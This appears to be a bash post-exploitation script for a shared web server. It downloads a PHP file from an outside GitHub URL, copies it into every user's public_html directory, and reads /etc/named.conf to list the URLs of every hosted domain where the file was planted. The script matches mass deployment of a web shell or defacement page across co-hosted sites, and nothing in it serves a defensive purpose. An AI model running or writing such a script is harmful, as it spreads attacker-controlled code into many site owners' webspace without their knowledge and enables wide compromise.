#!/usr/bin/env bash
set -euo pipefail

# Prompt user to enter the filename
read -r -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload

# Source URL (raw file)
URL="https://raw.githubusercontent.com/chuckyreply/xTRI_D/main/bps.php"

# Temp file for download
tmpf="$(mktemp --suffix=.php)" || tmpf="/tmp/$(date +%s).php"

cleanup() {
  rm -f "$tmpf"
}
trap cleanup EXIT

echo "Downloading from: $URL ..."
# Use curl to get a proper failure on non-2xx and follow redirects quietly
if ! curl -fsSL "$URL" -o "$tmpf"; then
  echo "Download failed (curl error). Aborting."
  exit 1
fi

# Quick sanity check: ensure downloaded file is not an HTML error page
if head -n 1 "$tmpf" | grep -qiE '<!doctype|<html'; then
  echo "Downloaded file looks like HTML (probably an error page). Aborting."
  echo "First line of download:"
  head -n 3 "$tmpf"
  exit 1
fi

# Optionally check it contains '<?php' to be more sure it's PHP
if ! grep -q "<?php" "$tmpf"; then
  echo "Warning: downloaded file does not contain '<?php'. Continue? (y/N)"
  read -r answer
  if [[ ! "$answer" =~ ^[Yy]$ ]]; then
    exit 1
  fi
fi

# Move/rename to requested filename (won't overwrite without prompt)
if [ -e "$file_to_upload" ]; then
  read -r -p "File '$file_to_upload' exists. Overwrite? (y/N) " yn
  if [[ ! "$yn" =~ ^[Yy]$ ]]; then
    echo "Aborted by user."
    exit 0
  fi
fi

mv -f "$tmpf" "$file_to_upload"
chmod 644 "$file_to_upload"
echo "Saved to $file_to_upload"

# Iterate through user public_html directories and copy the file
shopt -s nullglob
for public in /home/*/public_html; do
  if [ -d "$public" ]; then
    # copy preserving filename; handle spaces with quotes
    cp -v -- "$file_to_upload" "$public/"
    echo "File uploaded to $public/"
  fi
done
shopt -u nullglob

# Parse /etc/named.conf for zone file names and build URLs
if [ -r /etc/named.conf ]; then
  echo "Contents of /etc/named.conf found — parsing for /var/named/*.db entries..."
  # extract the base filename (without .db) from /var/named/<name>.db
  # use grep -oP to robustly extract; fallback to sed if grep -P not available
  if grep -qP '.' /dev/null 2>/dev/null; then
    domains=$(grep -oP '/var/named/\K[^/]+(?=\.db)' /etc/named.conf || true)
  else
    domains=$(grep -o '/var/named/[^/]\+\.db' /etc/named.conf | sed -E 's#.*/([^/]+)\.db#\1#' || true)
  fi

  if [ -z "$domains" ]; then
    echo "No /var/named/*.db entries found in /etc/named.conf."
  else
    echo "Available URLs pointing to uploaded file:"
    while IFS= read -r d; do
      [ -z "$d" ] && continue
      # If domain is like 'example.com' print full URL; otherwise skip weird names
      echo "https://$d/$file_to_upload"
    done <<< "$domains"
  fi
else
  echo "/etc/named.conf not readable or not found."
fi

echo "Done."
